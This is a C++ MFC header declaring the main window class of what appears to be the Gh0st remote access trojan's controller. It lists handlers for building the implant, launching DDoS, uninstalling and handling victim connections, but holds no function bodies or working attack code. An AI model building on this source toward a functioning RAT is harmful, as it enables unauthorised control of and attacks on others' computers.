#include <afxframewndex.h>

#include "TrayIcon.h"	// Added by ClassView

#pragma once

#include "gh0st.h"	
#include "TabSDIFrameWnd.h"

#define CFrameWndEx CTabSDIFrameWnd

class CMainFrame : public CFrameWndEx
{
	
protected: // create from serialization only
	CMainFrame();
	DECLARE_DYNCREATE(CMainFrame)

// Attributes
public:
	CToolBar		m_wndToolBar;
	UINT m_nAppLook;
	CImageList img;

// Operations
public:

// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CMainFrame)
	public:
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
	//}}AFX_VIRTUAL

// Implementation
public:
	CSize LoadMyBitmap(UINT nID);
	BOOL CreateExToolBar();
	void ShowToolTips(LPCTSTR lpszText);
	void ShowConnectionsNumber();
	static void ProcessReceiveComplete(ClientContext *pContext);
	static void ProcessReceive(ClientContext *pContext);
	void Activate(UINT nPort, UINT nMaxConnections);
	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode);
	virtual ~CMainFrame();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif //_DEBUG

protected:  // control bar embedded members
	CStatusBar  m_wndStatusBar;

// Generated message map functions
protected:
	//{{AFX_MSG(CMainFrame)
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnClose();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg LRESULT OnTrayNotification(WPARAM wParam,LPARAM lParam);
	afx_msg void OnUpdateStatusBar(CCmdUI *pCmdUI);
	afx_msg void OnShow();
	afx_msg void OnHide();
	afx_msg void OnExit();
	afx_msg void OnAbout();
	afx_msg void OnHelp();
	afx_msg void OnSetting();
	afx_msg void OnBuildServer();
	afx_msg void OnUpIp();
	afx_msg void OnExit1();
	afx_msg void OnSysRecord();
	afx_msg void OnDdos();
	afx_msg void OnUninstall();

	afx_msg void OnTimer(UINT nIDEvent);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:
	CTrayIcon m_TrayIcon;
};

/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.
